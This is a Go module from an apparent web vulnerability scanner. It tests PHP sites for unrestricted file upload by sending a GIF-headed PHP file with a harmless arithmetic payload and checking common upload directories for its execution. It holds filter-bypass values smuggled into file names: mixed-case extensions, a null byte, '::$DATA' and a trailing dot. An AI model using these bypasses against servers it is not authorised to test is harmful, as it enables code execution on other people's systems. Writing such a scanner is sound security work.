package uploadScan

import (
	"context"
	"fmt"
	"github.com/B9O2/Multitasking"
	"github.com/OctopusScan/webVulScanEngine/base"
	"github.com/OctopusScan/webVulScanEngine/conf"
	"github.com/OctopusScan/webVulScanEngine/result"
	"github.com/OctopusScan/webVulScanEngine/utils"
	"net/textproto"
	"net/url"
	"strconv"
	"strings"
	"time"
)

var phpExtension = []string{
	"php",
	"PhP",
	"PhP3",
	"phtml",
	"PhP4",
	"PhP5",
	"php.",
	"PhP.",
}
var phpExtensionByPass = []string{
	"",
	" ",
	"%00",
	"::$DATA",
}
var normalUploadPath = []string{
	"upload",
	"uploads",
	"files",
	"documents",
	"images",
	"media",
	"hackable/uploads",
}
var contentType = []string{
	"image/png",
	"image/jpeg",
	"text/plain",
}

type uploadPayload struct {
	result   string
	filename string
	mimes    []base.Mime
}

type UploadScan struct {
	base.BaseTarget
	uploadPayloads []uploadPayload
	uploadPaths    []string
	conf           conf.UploadScanConfig
}

func NewUploadScanner(target base.BaseTarget, config conf.UploadScanConfig) *UploadScan {
	return &UploadScan{
		BaseTarget: target,
		conf:       config,
	}
}

func (u *UploadScan) StartAttack() ([]result.VulMessage, error) {
	u.prePare()
	for _, p := range u.uploadPayloads {
		res, err := u.SendWithMultipart(base.DefaultRequestOptionsWithRetry, p.mimes)
		if err != nil {
			continue
		}
		if res.StatusCode != 200 {
			continue
		}
		uploadCheckMT := Multitasking.NewMultitasking("uploadCheckMT", nil)
		uploadCheckMT.SetErrorCallback(func(controller Multitasking.Controller, err error) {
			if err != nil {
				utils.WriteErrorLog(fmt.Sprintf("uploadCheckMTError:%s\n", err.Error()))
			}
		})
		uploadCheckMT.Register(func(dc Multitasking.DistributeController) {
			for _, path := range u.uploadPaths {
				dc.AddTask(map[string]interface{}{"path": path, "payload": p})
			}
		}, func(ec Multitasking.ExecuteController, i interface{}) interface{} {
			param := i.(map[string]interface{})
			path := param["path"].(string)
			payload := param["payload"].(uploadPayload)
			path = strings.TrimRight(path, "/")
			upUrl := path + "/" + payload.filename
			resp, err := u.SendRequest("", base.Param{}, base.RequestOptions{
				Redirect:    false,
				Retry:       true,
				RetryMaxNum: 3,
				RequestSingleUseOption: base.RequestSingleUseOption{
					Url:     upUrl,
					Method:  base.GET,
					Headers: nil,
				},
			})
			if err != nil {
				return nil
			}
			if strings.Contains(resp.Body, payload.result) {
				ec.Terminate()
				return upUrl
			}
			return nil
		})
		checkRes, _ := uploadCheckMT.Run(context.Background(), uint(len(u.uploadPaths)))
		for _, r := range checkRes {
			if r != nil {
				return []result.VulMessage{{
					DataType: result.WebVul,
					VulnData: result.VulnData{
						CreateTime:  time.Now().Format("2006-01-02 15:04:05"),
						VulnType:    result.FileUpload,
						VulnSubType: result.PhpFileUpload,
						Target:      u.Url,
						Method:      u.Method,
						Param:       "",
						Payload:     r.(string),
						CURLCommand: "",
						Description: "",
						Request:     res.RequestDump,
						Response:    res.ResponseDump,
					},
					Plugin: result.FileUploadDetect,
					Level:  result.Critical,
				}}, err
			}
		}

	}
	return []result.VulMessage{}, nil
}
func (u *UploadScan) prePare() {
	var paths []string
	parseUrl, _ := url.Parse(u.Url)
	baseUrl := fmt.Sprintf("%s://%s", parseUrl.Scheme, parseUrl.Host)
	tmpPaths := strings.Split(parseUrl.Path, "/")
	//去除带后缀的路径
	for _, v := range tmpPaths {
		if !strings.Contains(v, ".") {
			paths = append(paths, v)
		}
	}
	//遍历组合
	for i := 0; i < len(paths); i++ {
		uploadPath := fmt.Sprintf("%s/%s", baseUrl, paths[i])
		uploadPath = strings.TrimRight(uploadPath, "/")
		baseUrl = uploadPath
		u.uploadPaths = append(u.uploadPaths, uploadPath)
		for _, up := range normalUploadPath {
			u.uploadPaths = append(u.uploadPaths, fmt.Sprintf("%s/%s", uploadPath, up))
		}
	}
	if u.conf.WebsiteExtension != "" {
		switch u.conf.WebsiteExtension {
		case base.PhpExtension:
			u.generatePhpPayload()
		default:
			u.generatePhpPayload()
		}
	} else {
		switch u.Extension {
		case base.PhpExtension:
			u.generatePhpPayload()
		default:
			u.generatePhpPayload()
		}
	}
}

func (u *UploadScan) generatePhpPayload() {
	for _, p := range phpExtension {
		for _, c := range contentType {
			phpCode := `GIF98a<?php echo {NUM1}+{NUM2};?>`
			filename := fmt.Sprintf("%s.%s", utils.GenerateRandomString(10), p)
			num1 := utils.RandNumber(1000000, 9999999)
			num2 := utils.RandNumber(1000000, 9999999)
			phpCode = strings.ReplaceAll(phpCode, "{NUM1}", strconv.Itoa(num1))
			phpCode = strings.ReplaceAll(phpCode, "{NUM2}", strconv.Itoa(num2))
			addResult := strconv.Itoa(num1 + num2)
			//拼接可能的php后缀绕过
			for _, pb := range phpExtensionByPass {
				var mimes []base.Mime
				for _, m := range u.Mimes {
					if m.IsFile {
						m.Data = phpCode
						CD := m.MimeHeader.Get("Content-Disposition")
						CT := m.MimeHeader.Get("Content-Type")
						if CT == "" {
							m.MimeHeader = textproto.MIMEHeader{"Content-Disposition": {strings.ReplaceAll(CD, "{FILENAME}", filename+pb)}}
						} else {
							m.MimeHeader = textproto.MIMEHeader{"Content-Disposition": {strings.ReplaceAll(CD, "{FILENAME}", filename+pb)}, "Content-Type": {strings.ReplaceAll(CT, "{CONTENT_TYPE}", c)}}
						}
						mimes = append(mimes, m)
					} else {
						mimes = append(mimes, m)
					}
				}
				u.uploadPayloads = append(u.uploadPayloads, uploadPayload{
					result:   addResult,
					filename: filename,
					mimes:    mimes,
				})
			}

		}
	}
}
